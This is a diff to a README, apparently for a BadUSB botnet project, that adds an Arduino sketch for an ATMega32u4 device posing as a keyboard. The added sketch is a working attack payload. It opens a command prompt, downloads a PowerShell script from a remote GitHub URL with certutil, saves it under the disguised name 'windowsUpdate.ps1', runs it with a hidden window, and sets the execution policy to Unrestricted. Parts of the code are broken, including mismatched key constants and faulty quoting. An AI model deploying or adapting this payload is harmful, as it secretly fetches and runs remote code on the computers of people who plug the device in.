@@ -119,7 +119,7 @@ or
 > reboot (?)
 ```
 
-## Example on digispark
+## Example with digispark
 
 <p align="center">
     <img src="https://img.staticbg.com/thumb/large/oaupload/banggood/images/78/0D/5586c82c-2791-44cf-baa6-3ebc5882ac2e.jpg" height="100px" width="100px"/>
@@ -171,6 +171,44 @@ for (;;) {
 Decompress the archive and put all in : ```C:\Users\Administrador\AppData\Local\Arduino15\packages\digistump\hardware\avr\1.6.7\libraries\DigisparkKeyboard```, later in the script you must put the following line to specify the keyboard layout.
 ```c
 #define kbd_es_es
+```
+
+## Example with ATMega32u4
+
+<p align="center">
+    <img src="https://steemitimages.com/DQmbXKQU5FScuc9bdhPjjVwBbFy4EK7LuTFtnMe7vEjV7W7/badusb.png" height="100px" width="150px"/>
+</p>
+
+```c
+#include <Keyboard.h>
+void setup() {
+  Keyboard.begin();//Start keyboard communication 
+  delay(3000);//Dela
+}
+void loop(){
+  Keyboard.press(MOD_GUI_LEFT);
+  Keyboard.press('d');
+  Keyboard.release(KEY_LEFT_GUI);
+  delay(500); 
+  
+  Keyboard.println('cmd');
+  delay(500); 
+  Keyboard.press(KEY_RETURN);
+  Keyboard.release(KEY_RETURN);
+  
+  Keyboard.println("certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1" "Documents/windowsUpdate.ps1"");
+  Keyboard.press(KEY_RETURN);
+  Keyboard.release(KEY_RETURN);
+  Keyboard.println("powershell.exe -windowstyle hidden -file "Documents/windowsUpdate.ps1"");
+  delay(500);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.release(KEY_RETURN);
+  Keyboard.println("powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted");
+  delay(500);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.release(KEY_RETURN);
+  Keyboard.end();
+}
 ```
 
 ### Telegram Options
